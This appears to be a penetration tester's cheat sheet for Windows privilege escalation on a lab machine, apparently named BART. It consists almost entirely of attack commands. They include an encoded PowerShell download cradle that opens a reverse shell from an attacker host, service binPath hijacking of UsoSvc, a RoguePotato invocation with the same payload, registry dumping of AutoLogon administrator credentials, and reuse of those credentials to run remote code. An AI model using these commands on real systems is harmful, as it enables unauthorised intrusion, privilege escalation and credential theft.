==============================================================================
[+] Services
==============================================================================
echo "IEX (IWR http://10.10.14.20:8000/Invoke-PowerShellTcp2.ps1 -UseBasicParsing)" | iconv -t utf-16le |base64 -w 0
sc.exe config usosvc binPath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="
sc.exe qc UsoSvc
sc.exe start UsoSvc
sc.exe stop UsoSvc
==============================================================================
[+] RoguePotato
==============================================================================
CLSID => http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
.\RoguePotato.exe -r 10.10.14.20 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA==" -l 9999
==============================================================================
[+] AutoLogon credentials 
==============================================================================
cd "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
[Environment]::Is64BitOperatingSystem
true
[Environment]::Is64BitProcess
true
Get-ItemProperty .

W

DefaultUserName               :  Administrator
DefaultPassword               :  3130438f31186fbaf962f407711faddb

$username = "BART\Administrator"                                            
$password = "3130438f31186fbaf962f407711faddb"                              
$secstr = New-Object -TypeName System.Security.SecureString                 
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
$cred = new-object - typename System.Management.Automation.PSCredential -argument $username, $secstr
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');} -Credential $cred -Computer localhost

==============================================================================
[+] Transfer files
==============================================================================
sudo impacket-smbserver smbFolder $(pwd) -smb2support
\\10.10.14.20\smbFolder\test.bat test.bat
